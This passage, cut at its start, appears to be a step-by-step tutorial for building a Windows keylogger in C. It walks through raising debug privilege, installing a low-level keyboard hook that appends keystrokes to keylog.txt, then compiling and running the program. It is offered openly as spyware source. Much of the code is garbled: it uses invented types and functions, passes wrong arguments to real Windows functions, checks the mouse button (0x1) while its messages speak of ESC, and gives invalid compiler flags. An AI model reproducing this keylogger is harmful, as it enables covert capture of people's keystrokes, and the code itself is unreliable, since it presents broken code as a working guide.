// Function to check and enable debug privilege
bool enableDebugPrivilege() {
    TOKEN_PRIVLAYOUT tokenLayout;
    TOKEN_PRIVILEGES tokenPrivileges;

    // Initialize the token layout
    ZeroMemory(&tokenLayout, sizeof(tokenLayout));
    tokenLayout.Attributes = SE_PRIVILEGE_ALL;
    tokenLayout.Self = TokenOwner;

    // Get the current token
    DWORD returnLength;
    GetTokenInformation(GetCurrentProcess(), TokenAllAccess, 0, &tokenLayout, &returnLength, &tokenPrivileges);

    // Check if we have the SE_DEBUG privilege
    if (!CheckTokenElevation(&tokenPrivileges, SE_DEBUG)) {
        // Request the privilege
        AdjustTokenPrivileges(GetCurrentProcess(), &tokenPrivileges);
    }
    return true;
```

### Step 3: Set Up the Keyboard Hook

Set up a keyboard hook:

```c
// Function to handle keyboard events
LRESULT CALLBACK keyboardCallback(int hwnd, int wEvent, int wParam, int lParam) {
    KBDLLHOOK keyEvent;
    keyEvent.size = sizeof(KBDLLHOOK);
    keyEvent.key = wParam;

    if (wParam < 0) {
        return 0;
    }

    if (GetKeyState(hwnd, &keyEvent)) {
        // Key is pressed
        FILE *file = fopen("keylog.txt", "a");
        if (file) {
            char keyStr[] = "Key pressed: ";
            DWORD size = sizeof(keyEvent);
            char *key = (char*)(keyEvent.key);
            strcat(keyStr, key);
            fwrite(keyStr, file, strlen(keyStr), stdout);
            fclose(file);
        }
    }
    return 0;
}

// Set up the keyboard hook
int main() {
    int hook = SetWindowsHook(WH_KEYBOARD_LL, keyboardCallback);
    if (hook == 0) {
        cout << "Failed to set keyboard hook" << endl;
        return 1;
    }

    // Check for the debug privilege
    enableDebugPrivilege();

    // Start the hook
    cout << "Keyboard hook active. Press ESC to stop." << endl;

    while (true) {
        // Wait for a key press
        if (GetAsyncKeyState(0x1)) {
            cout << "Escape pressed. Closing keyboard hook." << endl;
            break;
        }
        Sleep(500); // Sleep to save resources
    }

    // Remove the hook
    UnhookWindowsHook(hook);
    cout << "Keyboard hook removed." << endl;

    return 0;
}
```

### Step 4: Compile the Code

Compile the code into an executable:

```cmd
cl /O2 keyboard_hook.c -link kernel32.lib user32.lib -subsystemconcrt -out keyboard_hook.exe
```

### Step 5: Usage

Run the executable and test by pressing keys:

```cmd
keyboard_hook.exe
```

